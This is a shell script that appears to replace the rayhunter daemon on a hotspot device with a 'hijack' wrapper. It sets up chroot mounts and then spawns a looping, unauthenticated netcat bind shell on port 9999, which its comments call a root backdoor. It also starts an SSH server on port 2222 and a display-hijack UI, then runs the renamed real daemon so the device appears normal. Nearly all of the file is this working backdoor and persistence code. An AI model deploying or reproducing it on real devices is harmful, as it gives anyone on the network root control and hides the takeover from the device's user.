#!/bin/sh
################################################################################
# SOS Integration Wrapper
#
# Purpose: Enhanced wrapper_v4.sh with SOS integration
# Location: Deploy to /data/rayhunter/wrapper_sos.sh
#
# This wrapper combines the existing FOLC functionality with SOS
################################################################################

LOG="/data/rayhunter/hijack.log"
echo "[-] SOS-Enhanced Wrapper Startup: $(date)" >> $LOG

# 1. Force Remount (Clean Slate)
umount /data/alpine/proc 2>/dev/null
umount /data/alpine/sys 2>/dev/null
umount /data/alpine/dev 2>/dev/null

mount -t proc proc /data/alpine/proc
mount -t sysfs sys /data/alpine/sys
mount -o bind /dev /data/alpine/dev
mkdir -p /data/alpine/dev/pts
mount -t devpts devpts /data/alpine/dev/pts

echo "[+] Remounted and setup devpts." >> $LOG

# 2. Launch Root Backdoor (Port 9999) - OUTSIDE CHROOT
if ! netstat -tlpn | grep 9999; then
    echo "[-] Spawning SYSTEM Root Backdoor on 9999..." >> $LOG
    (while true; do /bin/busybox nc -ll -p 9999 -e /bin/sh; sleep 1; done) &
fi

# 2.1 Launch SSH Entrance (Port 2222) - INSIDE CHROOT
if ! netstat -tlpn | grep 2222; then
    echo "[-] Spawning Alpine SSH Entrance on 2222..." >> $LOG
    chroot /data/alpine /usr/sbin/dropbear -p 2222 -R
fi

# 2.2 START SOS (NEW) - Service Orchestration System
echo "[-] Starting SOS (Service Orchestration System)..." >> $LOG
if [ -f /data/rayhunter/sos_manager.sh ]; then
    /bin/sh /data/rayhunter/sos_manager.sh start >> $LOG 2>&1 &
    echo "[+] SOS started successfully" >> $LOG
else
    echo "[!] SOS manager not found, skipping..." >> $LOG
fi

# 3. Launch FOLC UI (Persistent Display Hijack)
if [ -f /data/rayhunter/start_folc_v2.sh ]; then
    echo "[-] Launching FOLC UI..." >> $LOG
    /bin/sh /data/rayhunter/start_folc_v2.sh &
fi

# 4. Launch Real Daemon
exec /data/rayhunter/rayhunter-daemon.bak "$@"
